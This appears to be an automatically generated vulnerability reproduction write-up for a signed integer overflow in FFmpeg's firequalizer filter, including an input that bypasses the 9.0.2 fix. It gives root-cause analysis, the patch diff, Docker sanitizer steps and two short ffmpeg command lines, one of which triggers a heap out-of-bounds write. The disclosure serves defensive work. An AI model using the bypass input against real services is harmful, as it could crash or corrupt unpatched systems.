# 78RL-2026-0007

## FFmpeg: original `firequalizer` overflow and post-fix guard bypass

| | |
|---|---|
| **Affected** | FFmpeg 9.0.1 for the original overflow; 9.0.1 and 9.0.2 for the bypass input — see *Which versions are affected* |
| **Fixed in** | 9.0.2 rejects the original oversized input; no complete bypass fix verified in the inspected source as of 2026-10-01 |
| **Advisory** | [FFmpeg issue #24344](https://code.ffmpeg.org/FFmpeg/FFmpeg/issues/24344). `78RL-2026-0007` is a project-assigned reproducer identifier, not a new advisory |
| **Severity** | Not assigned by upstream for these reproductions |
| **Class** | CWE-190 signed integer overflow; the separate bypass input also reaches a CWE-787 heap out-of-bounds **write** |
| **Where** | `libavfilter/af_firequalizer.c`, `config_input()` and `generate_kernel()` |
| **Entry point** | FFmpeg CLI `-af firequalizer=delay=30000` or `delay=12180` on a 44,100 Hz audio stream |

## At a glance

Two scripts show what changed between FFmpeg 9.0.1 and 9.0.2. With
[`delay=30000`](run-original.sh), 9.0.1 overflows while calculating `fir_len`;
9.0.2 rejects the input. This first test does **not** demonstrate an
out-of-bounds access.

The smaller [`delay=12180`](run-bypass.sh) passes the new 9.0.2 guard. It
overflows a later multiplication, and AddressSanitizer reports a four-byte
write just before `analysis_buf` on **both** releases. The same fault in 9.0.2
shows that the fix is incomplete.

Both tests run through the `ffmpeg` CLI with its built-in `sine` source. The
filter options are the inputs; no media file is needed.

## Root cause

In 9.0.1, `config_input()` calculates the FIR length without bounding the
delay (`af_firequalizer.c:739`):

```c
s->fir_len = FFMAX(2 * (int)(inlink->sample_rate * s->delay) + 1, 3);
```

At 44,100 Hz, `delay=30000` gives 1,323,000,000 delayed samples. That fits
in a signed 32-bit `int`, but doubling it would produce 2,646,000,000,
above `INT_MAX`. UndefinedBehaviorSanitizer stops at this multiplication.

At the same sample rate, `delay=12180` gives 537,138,000 delayed samples and
`fir_len = 1,074,276,001`. The new guard accepts this value. A later loop
still doubles `s->nsamples_max`, which can be negative:

```c
s->rdft_len = 1 << rdft_bits;
s->nsamples_max = s->rdft_len - s->fir_len + 1;
if (s->nsamples_max * 2 >= s->fir_len)
    break;
```

When `rdft_len` is 16, `nsamples_max` is `-1,074,275,984`. Doubling it
overflows a signed 32-bit integer. In the tested build, the loop accepts
`rdft_len = 16` after UBSan reports the overflow.

With the default `accuracy=5`, `analysis_rdft_len` is 16,384, and
`analysis_buf` holds 16,386 floats (65,544 bytes). The kernel loop runs up to
`fir_len / 2`. At `k = 16,385`, the destination index
`analysis_rdft_len - k` is `-1`:

```c
s->analysis_buf[s->analysis_rdft_len - k] = s->analysis_buf[k];
```

AddressSanitizer catches the four-byte write at `af_firequalizer.c:684` in
both builds. Signed overflow is undefined behavior, so other builds may take
a different path through the loop.

### The fix

The [9.0.2 patch](https://github.com/FFmpeg/FFmpeg/commit/e00134132eed3aad18e6f5a0d61f1b65a7bc6e95)
checks the delayed sample count before converting it to `int` and doubling
it. It rejects non-finite or oversized values. Here is the relevant part of
the patch, abridged:

```diff
-s->fir_len = FFMAX(2 * (int)(inlink->sample_rate * s->delay) + 1, 3);
+const double delay_samples = inlink->sample_rate * s->delay;
+if (!isfinite(delay_samples) || delay_samples >= (INT_MAX + 1.0) / 2) {
+    av_log(ctx, AV_LOG_ERROR, "too large or non-finite delay, please decrease it.\n");
+    return AVERROR(EINVAL);
+}
+s->fir_len = FFMAX(2 * (int)delay_samples + 1, 3);
```

The original input produces 1,323,000,000 delayed samples, above the new
1,073,741,824-sample cutoff, so 9.0.2 rejects it. The bypass input produces
537,138,000 samples and passes. The patch did not change the later
`s->nsamples_max * 2` comparison, which still leads to the heap write in the
tested 9.0.2 build.

## How the proof of concept works

[`run-original.sh`](run-original.sh) tests the original overflow against
both releases:

```bash
ffmpeg -hide_banner -nostdin -loglevel error -y \
  -f lavfi -i sine=frequency=440:sample_rate=44100:duration=0.1 \
  -af firequalizer=delay=30000 -f null -
```

[`run-bypass.sh`](run-bypass.sh) changes only the delay:

```bash
ffmpeg -hide_banner -nostdin -loglevel error -y \
  -f lavfi -i sine=frequency=440:sample_rate=44100:duration=0.1 \
  -af firequalizer=delay=12180 -f null -
```

The 0.1-second sine wave is enough to configure the filter; the `null` muxer
discards its output. The bypass script also tests `delay=1e10` on 9.0.2. The
guard rejects this control input without a sanitizer finding, confirming
that the patched guard is present. [`run.sh`](run.sh) runs both scripts.

## Which versions are affected

Both official release archives were built and tested with both inputs. The
branch entries below are source inspections only.

| Ref | Original `delay=30000` | Bypass `delay=12180` | Evidence |
|---|---|---|---|
| FFmpeg 9.0.1 release | UBSan signed overflow | ASan heap out-of-bounds write | Docker CLI and sanitizer logs below |
| FFmpeg 9.0.2 release | Rejected by the new guard | ASan heap out-of-bounds write | Docker CLI and sanitizer logs below |
| [`release/9.0` at `2a571b6`](https://github.com/FFmpeg/FFmpeg/blob/2a571b606854520cf89804d8030c8b328e621689/libavfilter/af_firequalizer.c) | Guard present in source | Downstream multiplication unchanged | Source inspected; no branch build run |
| [`master` at `5a54fcf`](https://github.com/FFmpeg/FFmpeg/blob/5a54fcf75e0245111075b1c31593ba1919c25306/libavfilter/af_firequalizer.c) | Guard present in source | Downstream multiplication unchanged | Source inspected; no branch build run |

As of 2026-10-01, `libavfilter/af_firequalizer.c` in both listed branch
commits matched the 9.0.2 release-tree file. All three had SHA-256
`4e84bd194b2b39680edffaf319f732d3d1c3a7a477c731f0e36a8d679af3324d`.
We did not build those branches or test other releases or distribution
backports.

## How to reproduce

From this directory, build the Docker image and run either script. Both
releases are built from official source archives with the same AddressSanitizer
and UndefinedBehaviorSanitizer flags.

```bash
docker build -t ffmpeg-firequalizer-poc:0007 build/
./run-original.sh
./run-bypass.sh
```

To run both tests in order, use `./run.sh`.

The Dockerfile verifies the archives before building:

| Source archive | SHA-256 |
|---|---|
| FFmpeg 9.0.1 | `cf38e0e28c7e5605942c4a77755349b0145804a397af37eb1fb4c77cb237f635` |
| FFmpeg 9.0.2 | `8c3850283eb25fa026482078a04051e0be17347b09ef81a0849bec15a96e002e` |

The scripts run the CLI in containers without network access, added Linux
capabilities, or privilege escalation. They save CLI and sanitizer output in
[`output/`](output/). The original script checks for the 9.0.1 overflow and
9.0.2 rejection. The bypass script checks for the overflow and four-byte
heap write on both versions, then checks the 9.0.2 guard control.

## Results

### Original calculation: `delay=30000`

[`output/original-vulnerable-9.0.1.txt`](output/original-vulnerable-9.0.1.txt)
records:

```text
src/libavfilter/af_firequalizer.c:739:18: runtime error: signed integer overflow: 1323000000 * 2 cannot be represented in type 'int'
    #0 ... in config_input src/libavfilter/af_firequalizer.c:739
[runner] exit status: 1
```

[`output/original-guarded-9.0.2.txt`](output/original-guarded-9.0.2.txt)
instead reports `too large or non-finite delay` and exits with status 234.
UndefinedBehaviorSanitizer stops the 9.0.1 run at the overflow. The 9.0.2
exit is a filter-configuration error.

### Post-fix bypass: `delay=12180`

[`output/vulnerable-9.0.1.txt`](output/vulnerable-9.0.1.txt) records the signed
overflow in `config_input()` and an AddressSanitizer `heap-buffer-overflow`:

```text
runtime error: signed integer overflow
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 4
generate_kernel ... libavfilter/af_firequalizer.c:684
4 bytes before 65544-byte region
[runner] exit status: 134
```

[`output/post-fix-9.0.2.txt`](output/post-fix-9.0.2.txt) shows the same
overflow and out-of-bounds write on 9.0.2, with exit status 134. This input
bypasses the new delay guard.

[`output/guard-control-9.0.2.txt`](output/guard-control-9.0.2.txt) instead
reports `too large or non-finite delay` for `delay=1e10`, with no sanitizer
finding. It exits with status 234 because the filter configuration failed.

## Impact and limitations

The first input proves signed overflow in 9.0.1 under
UndefinedBehaviorSanitizer. The second produces a four-byte heap
out-of-bounds write on both releases under sanitizer instrumentation. Both
inputs reach the filter through an FFmpeg CLI option. An application that
lets untrusted users set `firequalizer` delay may expose the same path, but
this PoC does not test any particular application.

These results come from the tested x86-64 sanitizer builds with 32-bit `int`.
Signed overflow is undefined behavior in C, so a different compiler, build,
or platform may behave differently. We did not test an ordinary unsanitized
9.0.x build or demonstrate control-flow corruption, code execution, or
network reachability. The sanitizer trace is the evidence for the heap write.

## Credit

Ayoub Nabil Boubagrat authored the [9.0.2 guard](https://github.com/FFmpeg/FFmpeg/commit/e00134132eed3aad18e6f5a0d61f1b65a7bc6e95).
`yijan4845` filed [upstream issue #24344](https://code.ffmpeg.org/FFmpeg/FFmpeg/issues/24344)
about the same remaining overflow before this PoC was prepared. PatchHawk's
post-fix review independently reproduced it while comparing FFmpeg 9.0.1 and
9.0.2.

## Author

Automatically generated by PatchHawk.
